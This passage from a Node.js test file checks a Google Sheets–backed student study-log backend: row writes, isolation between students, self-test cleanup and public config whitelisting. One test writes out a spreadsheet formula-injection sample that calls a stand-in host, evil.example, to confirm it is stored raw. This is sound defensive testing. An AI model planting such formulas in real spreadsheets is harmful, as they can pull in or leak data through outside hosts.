  assertBlankRow(rows[0], 7, '第一個 matched 列應被清空');
  assertBlankRow(rows[1], 7, '第二個 matched 列應被清空');
  assertBlankRow(rows[2], 7, '第三個 matched 列應被清空');
  assert.deepEqual(rows[3], s2Before, 'S2 的列必須逐格不變');
});

check('writeRowsFor_: 追加超出 maxRows -> 先 insertRowsAfter 擴張再寫入，不擲 grid limits 例外', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const header = ['id', 'student_id', 'date', 'subject_code', 'hours', 'content', 'updated_at'];
  // maxRows 剛好等於目前已用列數（表頭 + 1 列），完全沒有多餘空間，追加
  // 2 筆一定會超出格線，逼 writeRowsFor_ 走 insertRowsAfter 那條路徑。
  sheetsStore.tinygrid = new FakeSheet(header, [['x1', 'S9', '2026-01-01', 'MATH', 1, '', 't0']], 2);
  assert.doesNotThrow(() => {
    sandbox.writeRowsFor_('tinygrid', () => false, [
      { id: 'n1', student_id: 'S9', date: '2026-01-02', subject_code: 'MATH', hours: 1, content: '', updated_at: 't1' },
      { id: 'n2', student_id: 'S9', date: '2026-01-03', subject_code: 'MATH', hours: 1, content: '', updated_at: 't2' }
    ]);
  }, '追加超出 maxRows 不應該讓 Sheets API 的 grid limits 錯誤冒出來');
  const sheet = sheetsStore.tinygrid;
  assert.equal(sheet.insertRowsAfterCalls.length, 1, '應該恰好呼叫一次 insertRowsAfter 擴張');
  assert.deepEqual(sheet.insertRowsAfterCalls[0], { afterRow: 2, numRows: 2 }, '應該從目前 maxRows(2) 之後插入剛好補足所需的列數');
  assert.equal(sheet.maxRows, 4, 'maxRows 應該擴張到剛好容納新追加的列');
  assert.equal(sheet.rows.length, 3, '原本 1 列 + 追加 2 列 = 3 列');
  assert.equal(sheet.rows[1][0], 'n1');
  assert.equal(sheet.rows[2][0], 'n2');
});

check('handleSaveDay 隔離性：學生 A 的 saveDay 不改動學生 B 的任何一列（逐格比對，含同日期不同學生）', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  // r4（S2, 2026-01-05）跟這次 S1 要存的同一天同一科，是隔離性最容易破的
  // 案例：keyPredicate 若漏判 student_id，會誤傷 S2 這一列。
  const s2Before = sheetsStore.records_2026.rows[3].slice(); // r4
  const s1OtherDate1 = sheetsStore.records_2026.rows[1].slice(); // r2：S1 在 2026-01-06
  const s1OtherDate2 = sheetsStore.records_2026.rows[2].slice(); // r3：S1 在 2025-12-29

  sandbox.handleSaveDay(studentActor, {
    date: '2026-01-05',
    records: [{ subject_code: 'MATH', hours: 3.5 }, { subject_code: 'ENG', hours: 1 }],
    mood: 'fired', reflection: '狀態回勇'
  });

  const rows = sheetsStore.records_2026.rows;
  assert.deepEqual(rows[3], s2Before, 'S2 在同一天的列必須逐格不變（隔離性最容易破的案例）');
  assert.deepEqual(rows[1], s1OtherDate1, 'S1 在其他日期的舊列必須逐格不變');
  assert.deepEqual(rows[2], s1OtherDate2, 'S1 在其他日期的舊列必須逐格不變');
  // S1 原本在 2026-01-05 只有 1 筆（r1，matched=1），這次存 2 筆
  // （newRows=2）：就地覆寫 r1，另一筆走空位／追加。
  assert.equal(rows[0][3], 'MATH');
  assert.equal(rows[0][4], 3.5);
});

check('writeRowsFor_ 前置檢查：Sheets 未定義時，在任何 range 操作前擲 SHEETS_API_MISSING（clearContentCalls 與任何寫入皆為 0）', () => {
  const { sandbox, sheetsStore, sheetsApiCalls } = loadSandbox({ withSheetsApi: false });
  assert.throws(
    () => sandbox.handleUpdateSettings(studentActor, { lang: 'en' }),
    (e) => e.code === 'SHEETS_API_MISSING'
  );
  assert.equal(sheetsApiCalls.length, 0, '不應該有任何 batchUpdate 呼叫');
  assert.equal(sheetsStore.students.clearContentCalls, 0);
  assert.equal(sheetsStore.students.insertRowsAfterCalls.length, 0, '也不應該有任何 grid 擴張呼叫');
  const rows = sandbox.readSheet('students');
  assert.equal(rows.find((r) => r.student_id === 'S1').lang, 'zh', '原始資料應該完全沒被動過');
});

check('runSelfTest: Sheets 進階服務未加入 -> problems 包含明確訊息，且不觸發往返驗證（不動真實資料）', () => {
  const { sandbox, sheetsStore } = loadSandbox({ withSheetsApi: false });
  const problems = sandbox.runSelfTest();
  assert.ok(
    problems.some((p) => p.indexOf('Google Sheets API') !== -1),
    'problems 應該包含明確指出缺少 Sheets API 進階服務、且講出補救方式的訊息'
  );
  // 往返驗證（會用 __SELFTEST__ 寫入 records_2026）必須因為 problems 已
  // 非空而被既有的 problems.length === 0 閘門擋下，完全不觸碰這個分頁。
  assert.equal(sheetsStore.records_2026.clearContentCalls, 0, '往返驗證不應該被觸發');
  assert.equal(sheetsStore.records_2026.rows.length, 4, 'records_2026 的列數應該維持原樣（seed 資料 4 列）');
});

check('writeRowsFor_: batchUpdate 擲例外時，分頁內容維持原狀', () => {
  const { sandbox, sheetsStore } = loadSandbox({ throwOnBatchUpdate: true });
  const before = JSON.parse(JSON.stringify(sheetsStore.students.rows));
  assert.throws(() => sandbox.handleUpdateSettings(studentActor, { lang: 'en' }));
  assert.deepEqual(sheetsStore.students.rows, before, 'batchUpdate 呼叫失敗時，原始資料必須完整保留');
});

// --- Task 22 fix round 2：拆成兩次呼叫（寫→清）、不依賴原子性 ---
//
// 下面三個測試需要「同一次呼叫裡 writeOps 與 clearOps 都非空」的場景，
// 才能分別控制第一次（寫）與第二次（清）各自成功／失敗。S1 在 seed
// 資料裡有 3 筆記錄（r1、r2、r3），用只認 student_id 的 keyPredicate、
// newRows 只給 1 筆，逼 matched.length(3) > newRows.length(1)：
// pairCount=1（1 筆就地覆寫，走第一次呼叫）、多出的 2 列清空（走第二次
// 呼叫）——與「newRows 少於 matched」那個測試同一個場景，這裡另外控制
// 哪一次呼叫失敗。

check('writeRowsFor_: 第一次呼叫（寫）失敗 -> 分頁完全不變，第二次呼叫（清）從未被觸發', () => {
  const { sandbox, sheetsStore, sheetsApiCalls } = loadSandbox({ throwOnCallNumber: 1 });
  const before = sheetsStore.records_2026.rows.map((r) => r.slice());
  assert.throws(() => {
    sandbox.writeRowsFor_('records_2026', (r) => r.student_id === 'S1', [
      { id: 'new1', student_id: 'S1', date: '2026-03-01', subject_code: 'MATH', hours: 1, content: 'x', updated_at: 't' }
    ]);
  });
  assert.equal(sheetsApiCalls.length, 1, '第一次呼叫失敗後，第二次（清空）呼叫不應該被送出');
  const after = sheetsStore.records_2026.rows;
  before.forEach((row, i) => assert.deepEqual(after[i], row, '第 ' + i + ' 列必須逐格不變（第一次呼叫失敗時，分頁完全不受影響）'));
});

check('writeRowsFor_: 第二次呼叫（清）失敗 -> 第一次已寫入的新內容仍在，多出的舊列變成 stale extra rows（逐格比對，不是憑空消失）', () => {
  const { sandbox, sheetsStore, sheetsApiCalls } = loadSandbox({ throwOnCallNumber: 2 });
  const r2Before = sheetsStore.records_2026.rows[1].slice(); // r2：本該被清空的其中一列
  const r3Before = sheetsStore.records_2026.rows[2].slice(); // r3：本該被清空的另一列
  assert.throws(() => {
    sandbox.writeRowsFor_('records_2026', (r) => r.student_id === 'S1', [
      { id: 'new1', student_id: 'S1', date: '2026-03-01', subject_code: 'MATH', hours: 1, content: 'x', updated_at: 't' }
    ]);
  });
  assert.equal(sheetsApiCalls.length, 2, '兩次呼叫都應該被送出（第二次記錄參數後才拋出例外）');
  const rows = sheetsStore.records_2026.rows;
  // 第一次呼叫（寫）成功：matched[0]（r1）已經就地覆寫成新內容。
  assert.equal(rows[0][0], 'new1', '第一次呼叫成功時，就地覆寫的內容應該已經寫入');
  assert.deepEqual(Array.from(rows[0]), ['new1', 'S1', '2026-03-01', 'MATH', 1, 'x', 't']);
  // 第二次呼叫（清）失敗：本該被清空的兩列，內容必須跟失敗前一模一樣
  // （逐格比對，不是只看「有沒有被清空」），這就是「stale extra rows」
  // ——多餘、看得見、能自我修復，不是資料遺失。
  assert.deepEqual(rows[1], r2Before, '第二次呼叫失敗時，本該清空的列必須維持原內容（不會半清空、也不會憑空消失）');
  assert.deepEqual(rows[2], r3Before, '第二次呼叫失敗時，本該清空的列必須維持原內容（不會半清空、也不會憑空消失）');
});

check('writeRowsFor_: 沒有多餘列需要清空時，只送出一次 batchUpdate（拆成兩次呼叫不影響最常見的路徑）', () => {
  const { sandbox, sheetsApiCalls } = loadSandbox();
  // matched === newRows.length（1 對 1 就地覆寫，沒有多餘列要清）：
  // 只應該送出「寫」那一次呼叫，「清」那一次完全不送。
  sandbox.handleUpdateSettings(studentActor, { lang: 'en' });
  assert.equal(sheetsApiCalls.length, 1, '沒有 clearOps 時，第二次呼叫應該完全不送出');
});

check('writeRowsFor_: 只有清空、沒有真實內容要寫時，也只送出一次 batchUpdate（第一次呼叫因為 writeOps 為空而跳過）', () => {
  const { sandbox, sheetsApiCalls } = loadSandbox();
  // handleClearDay：newRows 一律是 []，matched 非空時 writeOps 必為空、
  // clearOps 非空——驗證這個情況下第一次（寫）呼叫會被跳過，只送出
  // 第二次（清）呼叫，而不是送一次內容為空的 batchUpdate。
  sandbox.handleClearDay(studentActor, { date: '2026-01-05' });
  const recordsCalls = sheetsApiCalls.filter((c) => c.data.some((d) => d.range.indexOf('records_2026!') === 0));
  assert.equal(recordsCalls.length, 1, '只清空、沒有要寫的新內容時，records_2026 應該只送出一次 batchUpdate（清空那一次）');
});

check('runSelfTest: Sheets 進階服務已加入時，完整跑完整批覆寫往返驗證，最後不留殘留列', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const problems = sandbox.runSelfTest();
  // problems 是在 vm context 內用 [] 建立、經 runSelfTest() 回傳的陣列，
  // 屬於另一個 JS realm；跟 host realm 的 [] 字面值用 assert.deepEqual
  // 比較會因為跨 realm 的內部識別差異誤判不相等，因此改用 .length 與
  // Array.from() 轉成 host realm 陣列後再輸出，兩者都是跨 realm 安全的
  // 操作（陣列方法／迭代協定本身可以跨 realm 正常運作，出問題的是
  // assert.deepEqual 內部的嚴格身分比較）。
  assert.equal(problems.length, 0, 'seed 資料乾淨時應該回傳空陣列，實際：' + JSON.stringify(Array.from(problems)));
  assert.equal(sheetsStore.records_2026.rows.filter((r) => r[0] !== '').length, 4, '往返驗證的 __SELFTEST__ 列應該已經清理乾淨，只剩原本 4 列 seed 資料');
});

check('runSelfTest: 上一次執行留下的 __SELFTEST__ 殘留列（regression：pre-clean before baseline）不會污染這次的往返驗證', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  // 模擬「前一次執行的 handleClearDay 在 finally 內失敗（或整個執行被
  // 平台中止），沒有機會清乾淨」：直接在 seed 資料裡多塞一列
  // __SELFTEST__，日期刻意跟往返驗證固定使用的 2000-01-01 相同——這是
  // 最容易觸發偽陽性的情況，isThisDay 會把它當成「這個學生這一天已有的
  // 列」直接拉進 matched／newRows 配對，不只是讓 before 基準線多算一筆。
  sheetsStore.records_2026.rows.push(['leftover1', '__SELFTEST__', '2000-01-01', 'X', 3, 'stale from previous run', 't']);
  const problems = sandbox.runSelfTest();
  assert.equal(problems.length, 0, '殘留列不應該讓這次的往返驗證誤判失敗（fix 之前，這裡會回報 3 筆「saveDay/clearDay 未如預期」的偽陽性），實際：' + JSON.stringify(Array.from(problems)));
  assert.equal(sheetsStore.records_2026.rows.filter((r) => r[0] !== '').length, 4, '殘留列與往返驗證本身用到的列都應該清乾淨，只剩原本 4 列 seed 資料');
});

check('writeRowsFor_: batchUpdate 的 valueInputOption 確為 RAW', () => {
  const { sandbox, sheetsApiCalls } = loadSandbox();
  sandbox.handleSaveComment(teacherActor, { studentId: 'S1', comment: 'x' });
  assert.equal(sheetsApiCalls.length, 1);
  assert.equal(sheetsApiCalls[0].valueInputOption, 'RAW');
});

check('writeRowsFor_: 以 = 開頭的內容原封不動傳給 Sheets API（不逃逸、不加引號、不砍字元）', () => {
  const { sandbox, sheetsApiCalls, sheetsStore } = loadSandbox();
  const dangerous = '=IMPORTXML("http://evil.example","//a")';
  sandbox.handleSaveComment(teacherActor, { studentId: 'S1', period: 'overall', comment: dangerous });
  const call = sheetsApiCalls[sheetsApiCalls.length - 1];
  assert.equal(call.valueInputOption, 'RAW');
  const commentColIdx = 3; // teacher_comments: student_id, cohort, period, comment, ...
  const entry = call.data.find((d) => d.values[0][0] === 'S1' && d.values[0][2] === 'overall');
  assert.ok(entry, '應該找到剛寫入的那一列');
  assert.equal(entry.values[0][commentColIdx], dangerous, '傳給 Sheets API 的值必須跟輸入一字不差，不可以有任何逃逸處理');

  // 本機模擬的「往返」：只證明我們自己的程式碼沒有竄改值，
  // 不證明 Google 真的不會把它解析成公式（見檔頭「不能證明」）。
  // handleGetStudentReport 在真實系統裡是後續另一次獨立的 doPost()
  // 執行（老師另外打開報告頁面），不是跟 handleSaveComment 同一次
  // 執行，所以先 freshen() 代表這一點，不是為了迴避 fix round 5 的
  // 平台行為限制。
  sheetsStore.teacher_comments.freshen();
  const report = sandbox.handleGetStudentReport(teacherActor, { studentId: 'S1', period: 'overall' });
  assert.equal(report.comment, dangerous);
});

check('writeRowsFor_: hours（數字）在傳給 Sheets API 的資料裡仍是 JS number，不是字串', () => {
  const { sandbox, sheetsApiCalls } = loadSandbox();
  sandbox.handleSaveDay(studentActor, {
    date: '2026-02-01',
    records: [{ subject_code: 'MATH', hours: 2.5 }]
  });
  const call = sheetsApiCalls.find((c) => c.data.some((d) => d.range.indexOf('records_2026!') === 0));
  assert.ok(call, '應該有一次對 records_2026 的 batchUpdate');
  const hoursColIdx = 4; // records_2026: id, student_id, date, subject_code, hours, ...
  const entry = call.data.find((d) => d.values[0][1] === 'S1' && d.values[0][2] === '2026-02-01' && d.values[0][3] === 'MATH');
  assert.ok(entry, '應該找到剛寫入的那一列（依 student_id + date + subject_code 篩選）');
  assert.equal(typeof entry.values[0][hoursColIdx], 'number', 'hours 必須維持 JS number 型別，不可被字串化');
  assert.equal(entry.values[0][hoursColIdx], 2.5);
});

// --- 密碼曾經以字元黑名單擋走 =/+/-/@ 開頭；黑名單已於 fix round 2 完全移除 ---

check('updateSettings: 以 - 開頭的合法密碼不再被拒絕（黑名單已移除，改用 writeRowsFor_ 統一處理）', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const res = sandbox.handleUpdateSettings(studentActor, { password: '-Secret1' });
  assert.equal(res.ok, true);
  // 驗證讀代表下一次獨立的請求（例如老師之後查帳號設定），先 freshen()。
  sheetsStore.students.freshen();
  const rows = sandbox.readSheet('students');
  assert.equal(rows.find((r) => r.student_id === 'S1').password, '-Secret1');
});

check('updateSettings: 以 = 開頭的密碼也不再被拒絕（不是黑名單白名單問題，是寫入端保證）', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const res = sandbox.handleUpdateSettings(studentActor, { password: '=Secret123' });
  assert.equal(res.ok, true);
  sheetsStore.students.freshen();
  const rows = sandbox.readSheet('students');
  assert.equal(rows.find((r) => r.student_id === 'S1').password, '=Secret123');
});

// --- getPublicConfig（T11 fix round 1）：登入畫面免認證讀 config 的白名單 action ---

/** 透過真正的 doPost() 入口呼叫（而不是直接呼叫 handler），連帶驗證這個
 * action 真的排在 verifyToken 之前——事件裡完全沒有 `token` 欄位，一如
 * 真實使用者在登入前送出的請求。*/
function callDoPost_(sandbox, action, payload) {
  const e = { postData: { contents: JSON.stringify({ action, payload: payload || {} }) } };
  return JSON.parse(sandbox.doPost(e)._text);
}

check('getPublicConfig：完全冇 token 都經 doPost() 呼叫得成，回傳齊六個白名單 key', () => {
  const { sandbox } = loadSandbox();
  const res = callDoPost_(sandbox, 'getPublicConfig', {});
  assert.equal(res.success, true);
  assert.deepEqual(
    Object.keys(res.data).sort(),
    ['app_name_en', 'app_name_zh', 'dse_start_date', 'exam_dates', 'quotes_en', 'quotes_zh']
  );
  assert.equal(res.data.dse_start_date, '2026-04-09');
});

check('getPublicConfig：config 分頁多咗白名單以外的敏感 key，一律唔會出現喺回應入面', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  // 模擬老師日後喺 config 分頁加咗一個從未預期會公開的 key。
  sheetsStore.config.rows.push(['secret_api_key', 'sk-super-secret-value']);
  const res = callDoPost_(sandbox, 'getPublicConfig', {});
  assert.equal(res.success, true);
  assert.equal('secret_api_key' in res.data, false);
  assert.equal(JSON.stringify(res.data).includes('sk-super-secret-value'), false);
  // current_cohort 本身唔屬於白名單，同樣要確認冇被夾帶出嚟。
  assert.equal('current_cohort' in res.data, false);
});

console.log('\n' + (failures === 0 ? 'ALL PASS' : failures + ' FAILURE(S)'));
process.exitCode = failures === 0 ? 0 : 1;
